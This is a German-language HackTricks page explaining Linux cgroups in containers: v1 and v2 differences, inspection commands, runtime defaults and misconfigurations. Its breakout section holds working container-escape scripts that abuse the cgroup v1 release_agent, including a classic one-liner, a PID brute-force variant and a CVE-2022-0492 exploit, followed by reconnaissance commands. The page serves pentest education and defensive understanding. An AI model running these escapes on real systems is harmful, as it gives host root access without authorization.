# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Überblick

Linux-**control groups** sind der vom Kernel bereitgestellte Mechanismus, um Prozesse für Abrechnung, Begrenzung, Priorisierung und Richtliniendurchsetzung zusammenzufassen. Während es bei Namespaces hauptsächlich darum geht, die Sicht auf Ressourcen zu isolieren, geht es bei cgroups hauptsächlich darum, zu steuern, **wie viele** dieser Ressourcen eine Gruppe von Prozessen verbrauchen darf und in manchen Fällen auch, **mit welchen Ressourcenklassen** sie überhaupt interagieren darf. Container verlassen sich ständig auf cgroups, selbst wenn der Benutzer sie nie direkt betrachtet, da fast jede moderne Runtime eine Möglichkeit benötigt, dem Kernel mitzuteilen: „Diese Prozesse gehören zu diesem Workload, und für sie gelten diese Ressourcenregeln.“

Aus diesem Grund platzieren Container-Engines einen neuen Container in einem eigenen cgroup-Teilbaum. Sobald sich der Prozessbaum dort befindet, kann die Runtime den Speicher begrenzen, die Anzahl der PIDs beschränken, die CPU-Nutzung gewichten, I/O regulieren und den Gerätezugriff einschränken. In einer Produktionsumgebung ist dies sowohl für die Sicherheit in Umgebungen mit mehreren Mandanten als auch für eine grundlegende betriebliche Hygiene unerlässlich. Ein Container ohne sinnvolle Ressourcenbeschränkungen kann möglicherweise den Speicher erschöpfen, das System mit Prozessen überfluten oder CPU und I/O auf eine Weise monopolisieren, die den Host oder benachbarte Workloads instabil macht.

Aus Sicherheitsperspektive sind cgroups in zwei getrennten Punkten relevant. Erstens ermöglichen fehlerhafte oder fehlende Ressourcenlimits unkomplizierte Denial-of-Service-Angriffe. Zweitens haben einige cgroup-Features, insbesondere in älteren **cgroup v1**-Setups, in der Vergangenheit leistungsfähige breakout primitives geschaffen, wenn sie aus einem Container heraus beschreibbar waren.

## v1 Vs v2

Es gibt zwei große cgroup-Modelle, die derzeit verbreitet sind. **cgroup v1** stellt mehrere Controller-Hierarchien bereit, und ältere Exploit-Berichte drehen sich häufig um die ungewöhnlichen und teilweise übermäßig mächtigen Semantiken, die dort verfügbar sind. **cgroup v2** führt eine stärker vereinheitlichte Hierarchie und im Allgemeinen saubereres Verhalten ein. Moderne Distributionen bevorzugen zunehmend cgroup v2, aber gemischte oder Legacy-Umgebungen existieren weiterhin. Daher sind beide Modelle bei der Untersuchung realer Systeme weiterhin relevant.

Der Unterschied ist wichtig, weil einige der bekanntesten Geschichten zu Container-breakouts, etwa der Missbrauch von **`release_agent`** in cgroup v1, sehr spezifisch mit dem Verhalten älterer cgroups verbunden sind. Wer einen cgroup-Exploit in einem Blog sieht und ihn anschließend blind auf ein modernes System anwendet, das ausschließlich cgroup v2 verwendet, wird wahrscheinlich falsch einschätzen, was auf dem Ziel tatsächlich möglich ist.

## Inspektion

Die schnellste Möglichkeit herauszufinden, wo sich die aktuelle Shell befindet, ist:
```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```
Die Datei `/proc/self/cgroup` zeigt die cgroup-Pfade, die dem aktuellen Prozess zugeordnet sind. Auf einem modernen cgroup-v2-Host sehen Sie häufig einen einheitlichen Eintrag. Auf älteren oder hybriden Hosts können mehrere v1-Controllerpfade angezeigt werden. Sobald Sie den Pfad kennen, können Sie die entsprechenden Dateien unter `/sys/fs/cgroup` untersuchen, um Limits und die aktuelle Nutzung anzuzeigen.

Auf einem cgroup-v2-Host sind die folgenden Befehle nützlich:
```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```
Diese Dateien zeigen, welche Controller vorhanden sind und welche davon an untergeordnete cgroups delegiert werden. Dieses Delegierungsmodell ist in Rootless- und systemd-verwalteten Umgebungen relevant, da die Runtime möglicherweise nur den Teil der cgroup-Funktionalität steuern kann, den die übergeordnete Hierarchie tatsächlich delegiert.

## Lab

Eine Möglichkeit, cgroups in der Praxis zu beobachten, besteht darin, einen Container mit begrenztem Speicher auszuführen:
```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```
Du kannst auch einen Container mit begrenzten PIDs ausprobieren:
```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```
Diese Beispiele sind nützlich, weil sie dabei helfen, das Runtime-Flag mit der Kernel-Dateischnittstelle zu verknüpfen. Die Runtime setzt die Regel nicht durch Magie durch; sie schreibt die relevanten cgroup-Einstellungen und überlässt es anschließend dem Kernel, diese auf den Prozessbaum anzuwenden.

## Runtime Usage

Docker, Podman, containerd und CRI-O verwenden cgroups als Teil des normalen Betriebs. Die Unterschiede bestehen normalerweise nicht darin, ob sie cgroups verwenden, sondern darin, **welche Defaults sie wählen**, **wie sie mit systemd interagieren**, **wie die rootless-Delegation funktioniert** und **wie viel der Konfiguration auf Engine-Ebene gegenüber der Orchestrierungs-Ebene gesteuert wird**.

In Kubernetes werden Resource Requests und Limits letztlich in eine cgroup-Konfiguration auf dem Node umgewandelt. Der Weg vom Pod-YAML bis zur Durchsetzung durch den Kernel führt über den kubelet, die CRI-Runtime und die OCI-Runtime, aber cgroups bleiben der Kernel-Mechanismus, der die Regel schließlich anwendet. In Incus/LXC-Umgebungen werden cgroups ebenfalls intensiv verwendet, insbesondere weil System-Container häufig einen umfangreicheren Prozessbaum und eher VM-ähnliche Betriebserwartungen bereitstellen.

## Misconfigurations And Breakouts

Die klassische cgroup-Sicherheitsgeschichte ist der beschreibbare **cgroup-v1-Mechanismus `release_agent`**. In diesem Modell konnte der Kernel einen vom Angreifer gewählten Pfad in den initialen Namespaces auf dem Host ausführen, wenn ein Angreifer in die richtigen cgroup-Dateien schreiben, `notify_on_release` aktivieren und den in `release_agent` gespeicherten Pfad kontrollieren konnte, sobald die cgroup leer wurde. Deshalb legen ältere Writeups so viel Wert auf die Beschreibbarkeit von cgroup-Controllern, Mount-Optionen sowie Namespace-/Capability-Bedingungen.

Auch wenn `release_agent` nicht verfügbar ist, bleiben cgroup-Fehler relevant. Ein zu weit gefasster Device-Zugriff kann dazu führen, dass Host-Geräte aus dem Container erreichbar sind. Fehlende Memory- und PID-Limits können eine einfache Code Execution in einen Host-DoS verwandeln. Eine schwache cgroup-Delegation in rootless-Szenarien kann Defender außerdem zu der falschen Annahme verleiten, dass eine Einschränkung existiert, obwohl die Runtime sie tatsächlich nie anwenden konnte.

### `release_agent` Background

Die `release_agent`-Technik gilt nur für **cgroup v1**. Die grundlegende Idee besteht darin, dass der Kernel das Programm ausführt, dessen Pfad in `release_agent` gespeichert ist, wenn der letzte Prozess in einer cgroup beendet wird und `notify_on_release=1` gesetzt ist. Diese Ausführung erfolgt in den **initialen Namespaces auf dem Host**, wodurch ein beschreibbares `release_agent` zu einem Container-Escape-Primitive wird.

Damit die Technik funktioniert, benötigt der Angreifer im Allgemeinen:

- eine beschreibbare **cgroup-v1**-Hierarchie
- die Möglichkeit, eine untergeordnete cgroup zu erstellen oder zu verwenden
- die Möglichkeit, `notify_on_release` zu setzen
- die Möglichkeit, einen Pfad in `release_agent` zu schreiben
- einen Pfad, der aus Sicht des Hosts auf eine ausführbare Datei verweist

### Classic PoC

Der historische einzeilige PoC lautet:
```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```
Dieser PoC schreibt einen Payload-Pfad in `release_agent`, löst die cgroup-Freigabe aus und liest anschließend die auf dem Host generierte Ausgabedatei zurück.

### Verständliche Schritt-für-Schritt-Erklärung

Dieselbe Idee lässt sich in einzelne Schritte unterteilen und ist so leichter zu verstehen.

1. Eine beschreibbare cgroup erstellen und vorbereiten:
```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```
2. Identifizieren Sie den Host-Pfad, der dem Container-Dateisystem entspricht:
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
3. Lege eine Payload ab, die über den Host-Pfad sichtbar sein wird:
```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```
4. Ausführung auslösen, indem die cgroup geleert wird:
```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```
Der Effekt ist die Ausführung des payload auf der Host-Seite mit den Root-Rechten des Hosts. Bei einem realen Exploit schreibt der payload normalerweise eine Beweisdatei, startet eine reverse shell oder verändert den Zustand des Hosts.

### Relative-Path-Variante mit `/proc/<pid>/root`

In einigen Umgebungen ist der Host-Pfad zum Container-Dateisystem nicht offensichtlich oder wird vom Storage-Treiber verborgen. In diesem Fall kann der Pfad des payload über `/proc/<pid>/root/...` angegeben werden, wobei `<pid>` eine Host-PID ist, die zu einem Prozess im aktuellen Container gehört. Darauf basiert die Brute-Force-Variante mit relativem Pfad:
```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
if [ $((${TPID} % 100)) -eq 0 ]
then
echo "Checking pid ${TPID}"
if [ ${TPID} -gt ${MAX_PID} ]
then
echo "Exiting at ${MAX_PID}"
exit 1
fi
fi
echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```
Der relevante Trick besteht hier nicht im Brute-Force selbst, sondern in der Pfadform: `/proc/<pid>/root/...` ermöglicht es dem Kernel, eine Datei innerhalb des Container-Dateisystems aus dem Host-Namespace aufzulösen, selbst wenn der direkte Speicherpfad des Hosts vorher nicht bekannt ist.

### CVE-2022-0492-Variante

Im Jahr 2022 zeigte CVE-2022-0492, dass das Schreiben in `release_agent` unter cgroup v1 nicht korrekt auf `CAP_SYS_ADMIN` im **initialen** User-Namespace prüfte. Dadurch war die Technik auf anfälligen Kernels deutlich leichter zugänglich, da ein Container-Prozess, der eine cgroup-Hierarchie mounten konnte, in `release_agent` schreiben konnte, ohne bereits im Host-User-Namespace privilegiert zu sein.

Minimaler Exploit:
```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
Auf einem verwundbaren Kernel führt der Host `/proc/self/exe` mit Root-Rechten des Hosts aus.

Für die praktische Ausnutzung solltest du zunächst prüfen, ob die Umgebung weiterhin beschreibbare cgroup-v1-Pfade oder gefährlichen Gerätezugriff offenlegt:
```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```
Wenn `release_agent` vorhanden und beschreibbar ist, befindest du dich bereits im Bereich des legacy-breakout:
```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```
Wenn der cgroup-Pfad selbst keinen Escape liefert, besteht die nächste praktische Nutzung oft in Denial of Service oder Reconnaissance:
```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```
Diese Befehle zeigen schnell, ob der Workload Spielraum für eine fork-bomb hat, aggressiv Speicher verbrauchen kann oder eine beschreibbare Legacy-cgroup-Schnittstelle missbrauchen kann.

## Prüfungen

Bei der Überprüfung eines Ziels besteht der Zweck der cgroup-Prüfungen darin festzustellen, welches cgroup-Modell verwendet wird, ob der Container beschreibbare Controller-Pfade sieht und ob alte Breakout-Primitives wie `release_agent` überhaupt relevant sind.
```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```
Was hier interessant ist:

- Wenn `mount | grep cgroup` **cgroup v1** anzeigt, sind ältere breakout writeups relevanter.
- Wenn `release_agent` vorhanden und erreichbar ist, lohnt sich das sofort für eine eingehendere Untersuchung.
- Wenn die sichtbare cgroup-Hierarchie beschreibbar ist und der Container außerdem über starke Capabilities verfügt, verdient die Umgebung eine deutlich genauere Überprüfung.

Wenn du **cgroup v1**, beschreibbare Controller-Mounts und einen Container mit starken Capabilities oder schwachem seccomp-/AppArmor-Schutz entdeckst, verdient diese Kombination besondere Aufmerksamkeit. cgroups werden oft als langweiliges Thema der Ressourcenverwaltung betrachtet, waren historisch jedoch Teil einiger der lehrreichsten Container-Escape-Ketten – gerade weil die Grenze zwischen „Ressourcenkontrolle“ und „Host-Einfluss“ nicht immer so klar war, wie viele angenommen haben.

## Runtime-Standards

| Runtime / Plattform | Standardzustand | Standardverhalten | Häufige manuelle Abschwächung |
| --- | --- | --- | --- |
| Docker Engine | Standardmäßig aktiviert | Container werden automatisch in cgroups platziert; Ressourcenlimits sind optional, sofern sie nicht mit Flags festgelegt werden | `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight` weglassen; `--device`; `--privileged` |
| Podman | Standardmäßig aktiviert | `--cgroups=enabled` ist der Standard; der cgroup-Namespace-Standard variiert je nach cgroup-Version (`private` bei cgroup v2, `host` bei einigen cgroup-v1-Setups) | `--cgroups=disabled`, `--cgroupns=host`, gelockerter Gerätezugriff, `--privileged` |
| Kubernetes | Standardmäßig über die Runtime aktiviert | Pods und Container werden von der Node-Runtime in cgroups platziert; eine fein abgestufte Ressourcenkontrolle hängt von `resources.requests` / `resources.limits` ab | Ressourcenanforderungen/-limits weglassen, privilegierter Gerätezugriff, Fehlkonfiguration der Runtime auf Host-Ebene |
| containerd / CRI-O | Standardmäßig aktiviert | cgroups sind Bestandteil der normalen Lifecycle-Verwaltung | direkte Runtime-Konfigurationen, die Gerätekontrollen lockern oder ältere beschreibbare cgroup-v1-Schnittstellen offenlegen |

Die wichtige Unterscheidung besteht darin, dass die **Existenz von cgroups** normalerweise Standard ist, während **nützliche Ressourcenbeschränkungen** häufig optional sind, sofern sie nicht ausdrücklich konfiguriert werden.
{{#include ../../../../banners/hacktricks-training.md}}
